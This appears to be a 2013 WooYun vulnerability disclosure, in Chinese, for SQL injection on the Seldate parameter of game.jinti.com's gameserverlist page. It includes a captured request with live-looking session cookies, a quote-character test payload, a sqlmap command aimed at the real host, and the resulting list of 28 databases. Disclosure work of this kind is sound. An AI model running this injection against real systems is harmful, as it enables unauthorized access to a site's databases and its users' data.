wybug_title: 今题网某分站SQL注入漏洞！
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2013-11-08：	细节已通知厂商并且等待厂商处理中									2013-11-13：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 今题网某分站SQL注入。 详细说明：  game 站应该用户很多的把.注入地址：http://game.jinti.com/gameserverlist抓包：
POST /gameserverlist HTTP/1.1Host: game.jinti.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://game.jinti.com/gameserverlistCookie: __utma=47193788.682951190.1383889676.1383889676.1383889676.1; __utmb=47193788.17.10.1383889676; __utmc=47193788; __utmz=47193788.1383889676.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); ASP.NET_SessionId=31aemzbs15ysgzuulxdiw155; Hm_lvt_8b038540dbde397c628c259a87fcd66b=1383889782; Hm_lpvt_8b038540dbde397c628c259a87fcd66b=1383891042; _iCast3_cookie_153421_1471=%7Bcount%3A2%2Clast%3A1383891045153%2Ctag%3A%229999_0_1%22%2Cexp%3A1383976184747%7D; activate=activatecode=2237ce64394e13d6b30f5cb007bc0ed1&activateusername=km11150418; _iCast3_cookie_153479_1471=%7Bcount%3A3%2Clast%3A1383890312179%2Ctag%3A%229999_0_1%22%2Cexp%3A1383976567739%7D; Debug=Times=15Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------23842244784257Content-Length: 254-----------------------------23842244784257Content-Disposition: form-data; name="SelGameID"8-----------------------------23842244784257Content-Disposition: form-data; name="Seldate"2013-11-14-----------------------------23842244784257--
构造注入：
Sqlmap -u "http://game.jinti.com/gameserverlist" --data "SelGameID=0&Seldate=2013-11-14" --dbs
   漏洞证明：  改包：在日期后面加个点报错
Content-Disposition: form-data; name="Seldate"2013-11-14'


sqlmap测试：


available databases [28]:[*] BBSDB[*] BBSDB_Caiji[*] CaiPiaoDB[*] ClientWebsiteDB[*] CompanyPhotoDB[*] CompanyWeb_3in1[*] DebugDB[*] GameUnionDB[*] HousingDB[*] HousingTrafficDB[*] HuodongDB[*] InfoUpdateServiceDB[*] JingJiRenDB[*] master[*] model[*] msdb[*] NeedDeleteDB[*] NewsDB[*] NEWUserResearchDB[*] Qhun[*] ReportServer[*] ReportServerTempDB[*] SEODB[*] ShowSHopDB[*] tempdb[*] UserResearchDB[*] XinAnDuiDB
   修复方案：  过滤Seldate,求礼物.   版权声明：转载请注明来源 xlz0iza1@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-11-13 15:05 厂商回复：  最新状态： 暂无
